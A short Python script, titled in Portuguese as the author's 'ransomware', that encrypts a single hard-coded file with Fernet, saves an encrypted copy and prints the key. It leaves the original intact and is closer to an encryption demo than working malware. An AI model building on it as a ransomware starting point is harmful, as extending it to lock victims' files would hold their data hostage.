Meu ransoware ..

from cryptography.fernet import Fernet
import os

# Gera uma chave
key = Fernet.generate_key()
cipher = Fernet(key)

# Exemplo: criptografar um único arquivo
file_path = "teste.txt"

# Lê conteúdo do arquivo
with open(file_path, "rb") as f:
    data = f.read()

# Criptografa
encrypted = cipher.encrypt(data)

# Salva o arquivo criptografado
with open(file_path + ".enc", "wb") as f:
    f.write(encrypted)

print("Arquivo criptografado com sucesso!")
print("Chave (guarde com cuidado!):", key.decode())
